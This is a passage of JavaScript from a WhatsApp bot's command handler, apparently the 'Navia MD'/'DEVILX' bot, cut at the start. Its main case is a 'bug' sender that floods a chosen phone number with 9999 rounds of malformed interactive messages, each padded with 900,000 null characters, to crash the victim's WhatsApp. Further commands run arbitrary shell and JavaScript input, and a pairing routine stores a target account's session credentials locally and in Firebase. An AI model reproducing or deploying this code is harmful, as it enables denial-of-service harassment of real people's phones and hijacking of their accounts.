  const incTarget = text.split("|")[0].replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return nevreply(`Err: Invalid Country Code`);
  
  let target = incTarget + '@s.whatsapp.net';
  let targetDisplay = incTarget;
  await nevreply(`Please wait, bug in the process of being delivered to: ${targetDisplay}\n\nPlease waiting until done!, this type of bug takes more than 30 seconds to fully send, the fastest is 1 minute and can be more`);
  for (let i = 0; i < 9999; i++) {
await conn.relayMessage(target, {groupStatusMessageV2: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
header: {
title: "dvx",
hasMediaAttachment: false
},
body: {
text: "dvx" + "\0".repeat(900000),
},
nativeFlowMessage: {
messageParamsJson: "Y",
buttons: [
{
name: "cta_url",
buttonParamsJson: "{}"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
]
}
}
}
}}, { participant: { jid: target } })
    await xnxx(target);
    await sleep(3000);
await conn.relayMessage(target, {groupStatusMessageV2: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
header: {
title: "dvx",
hasMediaAttachment: false
},
body: {
text: "dvx" + "\0".repeat(900000),
},
nativeFlowMessage: {
messageParamsJson: "Y",
buttons: [
{
name: "cta_url",
buttonParamsJson: "{}"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
]
}
}
}
}}, { participant: { jid: target } })
    await sleep(500);
  }

  const successText = `Bug successfully sent, please give it a break to avoid crashes\n\nTarget: ${targetDisplay}\nBy: Navia Md`;
  
  await conn.sendMessage(m.chat, {
    productMessage: {
      title: "✅ Bug Delivery Success",
      description: successText,
      thumbnail: { url: 'https://lannytourl.vestia.icu/api/file/692e4e85da88e864f2cfbc56.png' },
      productId: "BUGSUCCESS001",
      retailerId: "NAVIA001",
      url: "https://github.com",
      body: "Bug Delivery Mekdi",
      footer: `Navia - MD | ${new Date().toLocaleTimeString()}`,
      priceAmount1000: 0,
      currencyCode: "JPY",
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: '检查目标',
            url: `https://wa.me/${targetDisplay}`,
            merchant_url: `https://wa.me/${targetDisplay}`,
          })
        },
        {
          name: "cta_copy",
          buttonParamsJson: JSON.stringify({
            display_text: "拷贝数",
            copy_code: targetDisplay,
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: 'Gh',
            url: 'https://github.com',
            merchant_url: 'https://github.com',
          })
        }
      ]
    }
  }, { quoted: qtoko });
}
break;

            case 'tagall':{
                const textMessage = args.join(" ") || "nothing";
                let teks = `tagall message :\n> *${textMessage}*\n\n`;
                const groupMetadata = await conn.groupMetadata(m.chat);
                const participants = groupMetadata.participants;
                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                conn.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, { quoted: fquoted.packSticker });
            }
            break
            case "exec": {
                if (!budy.startsWith(".exec")) return;
                
                const { exec } = require("child_process");
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return reply(`*ex:* ${prefix + command} ls`);
                exec(args, (err, stdout) => {
                    if (err) return reply(String(err));
                    if (stdout) return reply(stdout);
                });
            }
            break;
            case "eval": {
                if (!budy.startsWith(".eval")) return;
                
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return reply(`*ex:* ${prefix + command} m.chat`);
                let teks;
                try {
                    teks = await eval(`(async () => { ${args.startsWith("return") ? "" : "return"} ${args} })()`);
                } catch (e) {
                    teks = e;
                } finally {
                    await reply(require('util').format(teks));
                }
            }
            break;
            
case 'getpair': {
  if (!isCreator) {
    return areply('*Khusus Admin Bot!*')
  }

  if (!m.isGroup) {
    await conn.updateBlockStatus(m.sender, 'block')
    return areply('*Perintah hanya bisa digunakan di grup. Kamu telah diblokir.*')
  }

  if (!q) {
    return areply(`Example:\n${prefix + command} 62xxxx`)
  }

  let Xreturn = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'') + "@s.whatsapp.net")
  let contactInfo = await conn.onWhatsApp(Xreturn)
  
  if (!contactInfo || contactInfo.length === 0) {
    return areply("Nomor tidak terdaftar di WhatsApp.")
  }

  const getpair = require('../function/pairing/rentbot.js')
  
  try {
    console.log(chalk.blue(`🔗 Starting Firebase pairing for: ${Xreturn}`));
    const checkFirebaseSession = async (phoneNumber) => {
      try {
        const firebaseService = require('./chelia-firebase.json');
        const admin = require('firebase-admin');
        
        let app;
        if (!admin.apps.length) {
          app = admin.initializeApp({
            credential: admin.credential.cert(firebaseService)
          }, `check_${Date.now()}`);
        } else {
          app = admin.app();
        }
        
        const db = admin.firestore();
        const sessionData = await db.collection('whatsapp_sessions')
          .doc(phoneNumber)
          .get();
        
        if (app.name !== '[DEFAULT]') {
          await app.delete();
        }
        
        if (sessionData.exists) {
          const data = sessionData.data();
          return `✅ Active (${data.lastUpdated ? new Date(data.lastUpdated.toDate()).toLocaleTimeString() : 'Just now'})`;
        } else {
          return '⏳ Waiting for first sync';
        }
      } catch (err) {
        console.error('Firebase check error:', err.message);
        return `❌ Error: ${err.message}`;
      }
    };

    await getpair(Xreturn);
    await sleep(2500);

    let pairingData;
    let pairingCode = "SCAN_QR_ONLY";
    
    try {
      if (fs.existsSync('./function/pairing/pairing.json')) {
        pairingData = fs.readFileSync('./function/pairing/pairing.json', 'utf-8');
        const parsed = JSON.parse(pairingData);
        pairingCode = parsed.code || "SCAN_QR_ONLY";
      }
    } catch (err) {
      console.log(chalk.yellow('⚠️ No local pairing data, using default'));
    }
    const phoneNumberClean = Xreturn.replace('@s.whatsapp.net', '');
    const firebaseStatus = await checkFirebaseSession(phoneNumberClean);
    
    const localSessionPath = `./function/pairing/pairing/${phoneNumberClean}`;
    const localStatus = fs.existsSync(localSessionPath) ? 
      (fs.existsSync(`${localSessionPath}/creds.json`) ? '✅ Active' : '⏳ Processing') : 
      '❌ Not found';
    try {
      if (fs.existsSync(`${localSessionPath}/creds.json`)) {
        const { state } = await useMultiFileAuthState(localSessionPath);
        if (state.creds.registered) {
          const targetConn = makeWASocket({
            auth: {
              creds: state.creds,
              keys: makeCacheableSignalKeyStore(state.keys, pino())
            },
            logger: pino({ level: 'silent' })
          });
          
          await targetConn.sendMessage(Xreturn, {
            text: `*🔥 DEVILX PAIRING NOTIFICATION*\n\n✅ Pairing berhasil!\n📱 Akun: ${phoneNumberClean}\n🔐 Code: ${pairingCode}\n⏰ Time: ${new Date().toLocaleTimeString()}\n🔗 Status: ${firebaseStatus}\n\n_Session tersimpan aman di Cloud_`
          });
          
          targetConn.ws.close();
        }
      }
    } catch (notifErr) {
      console.log(chalk.yellow(`⚠️ Skip target notification: ${notifErr.message}`));
    }

    await conn.sendMessage(m.chat, {
      productMessage: {
        title: "✅ Pairing Code - Firebase System",
        description: `Cloud Backup Active | Target: ${phoneNumberClean}`,
        thumbnail: { 
          url: 'https://lannytourl.vestia.icu/api/file/692ec2a932025e2659d5a0e0.jpg' 
        },
        productId: `PAIR_${Date.now()}`,
        retailerId: "DEVILX_FIREBASE",
        url: "https://github.com/DEVILX-BOT",
        body: `🔐 Pairing System v2.0\n📱 ${phoneNumberClean}\n🔥 Firebase Cloud Backup`,
        footer: `🔄 Auto-Reconnect Enabled | ${new Date().toLocaleTimeString()}`,
        priceAmount1000: 0,
        currencyCode: "JPY",
        buttons: [
        {
          name: "cta_copy",
          buttonParamsJson: JSON.stringify({
            display_text: 'Salin Nomor Target',
            copy_code: Xreturn.replace('@s.whatsapp.net', ''),
          })
        },
        {
          name: "cta_copy",
          buttonParamsJson: JSON.stringify({
            display_text: "Salin Kode Pairing",
            copy_code: yp.code,
          })
        }, 
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
              display_text: "📊 View Session Status",
              id: `status_${phoneNumberClean}`
       })
       }
      ]
    }
  }, { quoted: m })

    areply(`🔥 *DEVILX PAIRING SUCCESS*\n
📱 *Target Number:* ${phoneNumberClean}
🔐 *Pairing Code:* ${pairingCode}
⏰ *Generated:* ${new Date().toLocaleTimeString()}
    
🔗 *CLOUD STATUS*
├─ Firebase: ${firebaseStatus}
├─ Local: ${localStatus}
└─ Auto-Reconnect: ✅ Enabled
    
📁 *SESSION INFO*
├─ Path: pairing/${phoneNumberClean}
├─ Backup: Cloud + Local
└─ Recovery: Auto from Firebase
    
⚠️ *INSTRUCTION*
• Berikan code ke user: *${pairingCode}*
• Atau suruh scan QR di devices
• Session aman di cloud
• Auto hidup jika mati

✅ *SYSTEM READY*`);

    // Simpan log pairing ke file
    const logData = {
      phone: phoneNumberClean,
      code: pairingCode,
      admin: m.sender,
      time: new Date().toISOString(),
      firebase: firebaseStatus,
      local: localStatus
    };
    
    const logDir = './logs/pairing';
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }
    
    fs.writeFileSync(
      `${logDir}/${phoneNumberClean}_${Date.now()}.json`,
      JSON.stringify(logData, null, 2)
    );

  } catch (error) {
    console.error(chalk.red(`❌ Pairing Error:`, error));
    
    areply(`❌ *PAIRING FAILED*\n
📱 Target: ${Xreturn.replace('@s.whatsapp.net', '')}
🔍 Error: ${error.message}
    
🔧 *TROUBLESHOOTING*
1. Pastikan nomor aktif di WhatsApp
2. Coba gunakan format 628xxx
3. Pastikan kuota internet cukup
4. Coba lagi dalam 1 menit
    
🔄 *ALTERNATIVE METHOD*
• Gunakan QR code manual
• Pair via WhatsApp Web
• Contact admin untuk bantuan
    
⚠️ Jika error terus, kemungkinan:
- Nomor sudah dipairing sebelumnya
- Limit pairing tercapai
- Server WhatsApp maintenance`);
  }
}
break;

            case 'eee': {
                let nevatxt = `> こんにちは、アドレス販売者が必要な場合は、最初に期間を選択してください`;
                const flowActions = [{
                    buttonId: 'action',
                    buttonText: { displayText: 'kosong' },
                    type: 4,
                    nativeFlowInfo: {
                        name: 'single_select',
                        paramsJson: JSON.stringify({
                            title: 'kosong',
                            sections: [{
                                title: 'kosong',
                                rows: [
                                    {
                                        header: 'kosong',
                                        title: 'kosong',
                                        description: 'kosong',
                                        id: `.buttonold`
                                    }
                                ]
                            }, {
                                title: 'kosong',
                                rows: [
                                    {
                                        header: 'kosong',
                                        title: 'kosong',
                                        description: 'kosong',
                                        id: `.buttonold`
                                    }
                                ]
                            }]
                        })
                    }
                }];

                const buttonMessage = {
                    image: { url: 'https://files.catbox.moe/msoysl.jpg' },
                    caption: nevatxt,
                    footer: `Nǐ hǎo, nǐ gānggāng shǐyòngle zhǐlìngq ${prefix + command}`,
                    buttons: flowActions,
                    headerType: 1,
                    viewOnce: true
                };

                await conn.sendMessage(m.chat, buttonMessage, { quoted: m });
                break;
            }

            default:
        }
    } catch (e) {
        console.error(chalk.redBright("Error:"), e);
    }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.redBright(`Update ${__filename}`));
    delete require.cache[file];
    require(file);
});
